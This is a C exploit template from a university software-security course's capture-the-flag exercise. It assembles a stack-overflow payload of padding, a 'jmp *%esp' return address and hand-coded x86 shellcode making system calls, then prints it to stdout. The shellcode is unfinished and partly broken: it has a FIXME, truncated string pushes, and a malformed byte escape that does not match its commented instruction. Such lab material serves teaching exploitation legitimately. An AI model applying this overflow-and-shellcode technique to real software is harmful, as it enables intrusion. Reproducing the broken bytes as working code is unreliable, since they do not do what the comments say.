/*
 * CTF-2 `vcat2' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	"\x1d\x90\x04\x08" /* &'jmp *%esp'	*/
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
   "\x68" "\x74\x78\x74\x2e"		// push "magic.txt"
   "\x68" "\x63\x69\x67\x61"
   "\x68" "\x6d"



   "\x68" "\x79\x7a\x7a\x79"		// push "xyyzz"
   "\x68" "\x78"			




	/* ------------------------------------	*/
   "\x6a\x14"                	//push   $0x14
   "\x58"                   	//pop    %eax
   "\xcd\x80"                	//int    $0x80
   "\x89\xc3"              		//mov    %eax,%ebx
   "\x6a0x0c"                	//push   $0xc
   "\x59"                   	//pop    %ecx
   "\x6a\x25"                	//push   $0x25
   "\x58"                   	//pop    %eax
   "\xcd\x80";                	//int    $0x80
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
